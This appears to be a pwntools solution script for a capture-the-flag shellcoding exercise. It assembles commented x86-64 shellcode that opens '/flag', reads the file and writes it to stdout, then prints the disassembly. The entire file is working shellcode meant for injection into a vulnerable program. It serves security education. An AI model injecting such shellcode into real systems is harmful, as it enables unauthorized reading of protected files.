from pwn import *
# io = process('./babyshell_level')

context.arch = 'amd64'

sc = asm('''
    ; //open("/flag", O_RDONLY, 0)
    mov rax, 0x2              ; //syscall number for open
    lea rdi, [rip + path]     ; //address of the string "/flag"
    xor esi, esi              ; //O_RDONLY = 0
    xor edx, edx              ; //mode (not needed for O_RDONLY)
    syscall                   ; //make the syscall

    ; //Save the file descriptor returned in rax
    mov rdi, rax              ; //move the file descriptor into rdi for read

    ; //read(fd, buf, 0x50)
    xor rax, rax              ; //syscall number for read (rax = 0)
    mov rsi, rsp              ; //buffer (use the stack)
    mov rdx, 0x50             ; //number of bytes to read
    syscall                   ; //make the syscall

    ; //write(1, buf, rax)
    mov rdx, rax              ; //rdx = number of bytes read
    mov rax, 0x1              ; //syscall number for write
    mov edi, 0x1              ; //file descriptor 1 (stdout)
    mov rsi, rsp              ; //buffer (use the stack)
    syscall                   ; //make the syscall

    ; //Exit the program
    mov rax, 60               ; //syscall number for exit
    xor edi, edi              ; //status code 0
    syscall                   ; //make the syscall


	path:
	.string "/flag"

	''')


# gdb.debug_shellcode(sc)
print(disasm(sc))